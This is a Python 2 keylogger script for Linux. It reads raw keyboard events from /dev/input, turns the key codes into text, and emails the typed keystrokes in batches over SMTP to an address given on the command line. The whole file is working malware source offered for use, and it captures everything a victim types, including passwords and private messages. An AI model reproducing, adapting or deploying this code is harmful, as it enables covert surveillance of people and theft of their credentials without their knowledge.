#!/usr/bin/python

import re
import struct
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

USE_TLS = None
SERVER = None
MAIL = None
BUF_SIZE = None
PASS = None
KEYBOARD = "qwerty"

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "[ENTER]", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
    43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "*", 56: "100", 57: "[SPACE]", 58: "[CAPSLOCK]",
    102: "[home]", 107: "[end]", 104: "[pg up]", 109: "[pg dn]", 105: "[RIGHT]", 103: "[UP]",106: "[RIGHT]", 108: "[DOWN]",
    71: "7", 72: "8", 73: "9", 78: "+", 75: "4", 76: "5", 77: "6", 79: "1", 80: "2", 81: "3", 96: "[ENTER]",
    82: "0", 83: ".", 99: "]prt scr]", 111: "[del]", 1: "[ESC]", 69: "[numlk]", 98: "/", 74: "-"
}
#
def get_infile_path():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")

        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]

        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)
        print infile_path
        return infile_path

def send_email(message):
    msg = MIMEMultipart()

    password = PASS
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    msg['Subject'] = "Log clavier"

    msg.attach(MIMEText(message, 'plain'))

    client = smtplib.SMTP(SERVER,1025)
    client.set_debuglevel(True)

    if USE_TLS is True:
        client.starttls()

    #server.login(msg['From'], password)
    client.sendmail(msg['From'], msg['To'], msg.as_string())
    client.quit() 

def main():
    pinfile_path = get_infile_path()
    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    infile_path = get_infile_path()
    in_file = open(infile_path, "rb")
    event = in_file.read(EVENT_SIZE)
    typed = ""

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)
        #print type, code, value
        if code != 1 and type == 1 and value == 0:
            if code in qwerty_map:
                typed += qwerty_map[code]
                print qwerty_map[code]
        event = in_file.read(EVENT_SIZE)
        if len(typed) > BUF_SIZE:
            send_email(typed)
            typed = ""
    in_file.close()

def usage():
    print("Usage : python2.7 keylogger.py [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa
    print("Examples: python2.7 keylogger.py doanhnn@localhost 123 127.0.0.1 notls 128")

def init_arg():
    if len(sys.argv) < 5:
        usage()
        exit()
    global EMAIL
    global SERVER
    global USE_TLS
    global BUF_SIZE
    global PASS
    EMAIL = sys.argv[1]
    PASS = sys.argv[2]
    SERVER = sys.argv[3]
    if sys.argv[4] is "tls":
        USE_TLS = True
    else:
        USE_TLS = False
    BUF_SIZE = int(sys.argv[5])


if __name__ == "__main__":
    init_arg()
    main()
